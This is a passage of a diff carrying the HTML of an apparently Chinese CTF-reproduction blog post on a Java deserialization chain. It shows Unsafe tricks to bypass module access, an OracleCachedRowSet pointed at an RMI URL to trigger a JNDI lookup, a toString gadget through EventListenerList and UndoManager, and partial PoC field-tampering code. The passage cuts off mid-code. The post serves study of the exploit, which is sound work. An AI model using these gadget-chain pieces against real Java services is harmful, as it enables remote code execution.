+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Original String: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">x</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 6. 修改字段值（需注意 char[] 是不可变的）  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">value</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sc">&#39;a&#39;</span><span class="p">;</span><span class="w"> </span><span class="c1">// 将首字母改为 &#39;a&#39;            declaredField.set(x, value); // 赋值  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 7. 输出修改后的字符串  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Modified String: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">x</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行之后就有<code>IllegalAccessException</code>报错</p>
+<hr>
+<blockquote>
+<p>使用unsafe</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">drive.tina.hotbutwsu</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Ys</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">	    </span><span class="c1">// 目标对象：x 的 Class 是 String        </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;Act like Angle&#34;</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="c1">// 获取目标x的类以及字段（为了进一步得到得出laredField）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">xx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">xField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xx</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">// Unsafe 通行证</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">unsafeClazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">theUnsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafeClazz</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">theUnsafe</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="w"> </span><span class="n">theUnsafe</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Module</span><span class="w"> </span><span class="n">baseModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getModule</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Ys</span><span class="p">.</span><span class="na">class</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unsafe</span><span class="p">.</span><span class="na">objectFieldOffset</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;module&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafe</span><span class="p">.</span><span class="na">getAndSetObject</span><span class="p">(</span><span class="n">currentClass</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">baseModule</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">xField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">// 获取原内容</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="o">[]</span><span class="p">)</span><span class="w"> </span><span class="n">xField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">x</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 方便打印出来看得懂</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">result</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="c1">// 进行内容修改</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">newContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;New Content Here&#34;</span><span class="p">.</span><span class="na">getBytes</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">arraycopy</span><span class="p">(</span><span class="n">newContent</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">Math</span><span class="p">.</span><span class="na">min</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">length</span><span class="p">,</span><span class="w"> </span><span class="n">newContent</span><span class="p">.</span><span class="na">length</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// 输出修改后的内容  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Modified string: \n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">x</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Done&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IllegalAccessException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="n">e</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//结果：</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//[B@4d405ef7</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//Act like Angle</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//Modified string: </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//New Content He</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//Done</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<hr>
+<p>书接上回</p>
+<h3 id="rmi">RMI
+</h3><p>根据参考中的参考——<a class="link" href="https://j1rry-learn.github.io/posts/%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E8%B5%9Bjdbcparty-%E5%AD%A6%E4%B9%A0%E9%AB%98%E7%89%88%E6%9C%ACjdk%E5%92%8C%E9%AB%98%E7%89%88%E6%9C%ACtomcat%E6%89%93jndi%E5%88%B0rce/"  target="_blank" rel="noopener"
+    >j1rry-learn blog</a></p>
+<p>找到的说法大概是，JDBC在连接的哪一个函数中禁止了JNDI和LADP。</p>
+<p>不过没找到。</p>
+<p>给出的poc里面，结合数据库是oracle数据库：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">OracleCachedRowSet</span><span class="w"> </span><span class="n">oracleCachedRowSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">OracleCachedRowSet</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">setDataSourceName</span><span class="p">(</span><span class="s">&#34;rmi://localhost:1099/Object&#34;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>把数据源名称设置为RMI链接，在反序列化的时候触发RMI远程对象调用</p>
+<p>另一个关键的是，<code>toString()</code></p>
+<hr>
+<blockquote>
+<p>toString()</p>
+</blockquote>
+<p>很新奇，这样的一个函数居然也可以。</p>
+<p>找了很多参考，看得原本就疼的头更疼了。</p>
+<p><a class="link" href="http://www.bmth666.cn/2024/03/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A-AliyunCTF-chain17%E5%A4%8D%E7%8E%B0/index.html"  target="_blank" rel="noopener"
+    >bmth&rsquo;s blog</a></p>
+<p>首先向我们走来的是<code>toString()</code>利用链之一的<code>javax.swing.event.EventListenList#readObject</code>中的<code>add</code>函数。</p>
+<p>函数代码如下：</p>
+<p><a class="link" href="https://postimg.cc/gnV87c0z"  target="_blank" rel="noopener"
+    ><img src="https://i.postimg.cc/GhNKHHwy/image.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image.png"
+	
+	
+></a></p>
+<p>被断点标红的地方就是入口。
+这里的<code>toString</code>体现在，类型为<code>Class&lt;T&gt;</code>的参数l或者t在被拼接到报错信息中的时候，可能触发<code>toString</code></p>
+<p>（actually，可能会有点不信，所以打算编写一个demo来验证。</p>
+<p>demo如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">class</span> <span class="nc">Person</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">toString</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;Person: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Person</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">p</span><span class="p">);</span><span class="w">  </span><span class="c1">// 自动调用toString  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;The person is &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">p</span><span class="p">;</span><span class="w">  </span><span class="c1">// 自动调用toString</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>）</p>
+<p>在此基础上，检查<code>writeObject</code>的参数是否可控——可控才有机会把evildemobytes写进去交给<code>readObject</code>反序列化触发。</p>
+<blockquote>
+<p>writeObject</p>
+</blockquote>
+<p><a class="link" href="https://postimg.cc/JHc3jRDz"  target="_blank" rel="noopener"
+    ><img src="https://i.postimg.cc/wMnW8v9L/image.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image.png"
+	
+	
+></a></p>
+<p>对传入的Object 强制转换为<code>EventListener</code>进行检查：</p>
+<ul>
+<li>不为空</li>
+<li>属于Serializable
+同时符合者进行writeObject操作</li>
+</ul>
+<p>所以现在要去找一个类：</p>
+<ul>
+<li>Serializable</li>
+<li>toString</li>
+<li>可以转换为<code>EventListener</code></li>
+</ul>
+<hr>
+<p>上面的参考文章经过一番推理：<code>javax.swing.undo.UndoManager#toString</code></p>
+<p>具体的推理和寻找过程不算复杂就是比较费人。</p>
+<p>从<code>UndoManager</code>类的<code>toString</code>方法入手，从里面涉及到的变量深入，找到可以进行操作的变量（类型不固定、内容不固定、无检查、有检查但可以绕开……）</p>
+<p>最主要的关键是涉及了<code>java.lang.String#valueOf</code>，代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">valueOf</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">obj</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s">&#34;null&#34;</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>若 <code>obj</code> 为 <code>null</code>，直接返回 <code>&quot;null&quot;</code></li>
+<li>否则，调用 <code>obj</code> 的 <code>toString()</code> 方法</li>
+</ul>
+<hr>
+<hr>
+<h3 id="poc">POC
+</h3><p>关于上面的东西如何使用。</p>
+<blockquote>
+<p>OracleCachedRowSet</p>
+</blockquote>
+<p>感觉java可以淹死人。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">```</span><span class="n">java</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">UnSafeTools</span><span class="p">.</span><span class="na">setObject</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">,</span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getSuperclass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;monitorLock&#34;</span><span class="p">),</span><span class="kc">null</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Vector</span><span class="w"> </span><span class="n">vector1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Vector</span><span class="p">();</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">vector1</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Vector</span><span class="w"> </span><span class="n">vector2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Vector</span><span class="p">();</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">vector2</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="s">&#34;222&#34;</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">metaData</span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;111&#34;</span><span class="p">,</span><span class="s">&#34;222&#34;</span><span class="p">};</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnSafeTools</span><span class="p">.</span><span class="na">setObject</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">,</span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getSuperclass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;matchColumnIndexes&#34;</span><span class="p">),</span><span class="n">vector1</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnSafeTools</span><span class="p">.</span><span class="na">setObject</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">,</span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getSuperclass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;matchColumnNames&#34;</span><span class="p">),</span><span class="n">vector2</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnSafeTools</span><span class="p">.</span><span class="na">setObject</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">,</span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;metaData&#34;</span><span class="p">),</span><span class="n">metaData</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnSafeTools</span><span class="p">.</span><span class="na">setObject</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">,</span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;reader&#34;</span><span class="p">),</span><span class="kc">null</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnSafeTools</span><span class="p">.</span><span class="na">setObject</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">,</span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;writer&#34;</span><span class="p">),</span><span class="kc">null</span><span class="p">);</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">UnSafeTools</span><span class="p">.</span><span class="na">setObject</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">,</span><span class="n">oracleCachedRowSet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;syncProvider&#34;</span><span class="p">),</span><span class="kc">null</span><span class="p">);</span><span class="w">    
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>对于这几行代码属实有点暂时不去深入研究了。
+但大概可以看出来是为了绕开<code>OracleCachedRowSet</code>的一些限制：</p>
+<ul>
+<li>解除同步锁</li>
+<li>篡改数据匹配规则</li>
+<li>重写元数据定义</li>
+<li>禁用数据管道——构造不可逆的离线数据集</li>
+</ul>
+<p>在那之后，把这个oracleCachedRowSet打包塞进<code>POJONode</code>中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
